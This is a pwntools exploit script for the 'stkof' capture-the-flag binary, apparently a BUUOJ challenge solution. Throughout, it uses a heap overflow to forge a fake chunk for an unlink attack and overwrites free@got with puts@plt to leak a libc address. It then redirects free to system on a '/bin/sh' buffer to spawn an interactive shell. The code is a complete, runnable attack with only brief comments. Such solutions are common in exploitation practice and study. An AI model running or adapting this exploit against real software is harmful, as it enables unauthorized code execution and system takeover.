import requests
from pwn import *

p = process('./stkof')
#p = remote('node3.buuoj.cn','29387')
elf = ELF('./stkof')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.binary = elf
context.log_level = 'debug'
context.timeout = 0.1

sda = lambda x,y:p.sendlineafter(x,y)
sdl = lambda x:p.sendline(x)
rct = lambda x:p.recvuntil(x)
prt = lambda x,y:log.info('\x1b[01;38;5;214m' + x + '==>' + hex(y) + '\x1b[0m')

def add(size):
    sdl('1')
    sdl(str(size))
    p.recvuntil('OK\n')

def edit(idx, content):
    sdl('2')
    sdl(str(idx))
    sdl(str(len(content)))
    p.send(content)
    p.recvuntil('OK\n')

def free(idx):
    sdl('3')
    sdl(str(idx))

add(0x20) #chunk1 Solve the IO problem
add(0x30) #chunk2 size is 0x40 when used
add(0x80) #chunk3 small bin size
add(0x20) #chunk4 Split from Top Chunk
#fake fd&bk
heap = 0x602150
fd=heap-0x18
bk=heap-0x10

#fake chunk in chunk1
payload =  p64(0)      #prev_size
payload += p64(0x20)   #size
payload += p64(fd)     #fd
payload += p64(bk)     #bk
payload += p64(0x20)   #next chunk's prev_size bypass the check
payload =  payload.ljust(0x30, 'a')

#heap overflow to overwrite chunk2
payload += p64(0x30)   #fake next chunk's prev_size
payload += p64(0x90)   #fake next chunk's prev_inuse
edit(2, payload)
free(3)
#Now we can change things on the BSS!!!

free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
prt('free_got',free_got)
prt('puts_got',puts_got)

#Overwrite &chunk1 with free@got to hijack free@got
#Overwrite &chunk2 with puts@got to leak puts@got
payload2 = p64(0)*2+p64(free_got)+p64(puts_got)
edit(2, payload2)

#Overwrite free@got with puts@plt
edit(1, p64(puts_plt))
free(2)#puts(puts@got) leak libc
p.recvuntil('OK\n')
leak = u64(p.recvline('').ljust(8,'\x00'))
prt('puts@got',leak)
libc_base = leak - libc.sym['puts']
prt('libc_base',libc_base)

#Overwrite free@got with system@plt
system_plt = libc.sym['system']
shell = system_plt + libc_base
edit(4,'/bin/sh')
edit(1, p64(shell))

#Get shell
free(4)

p.interactive()
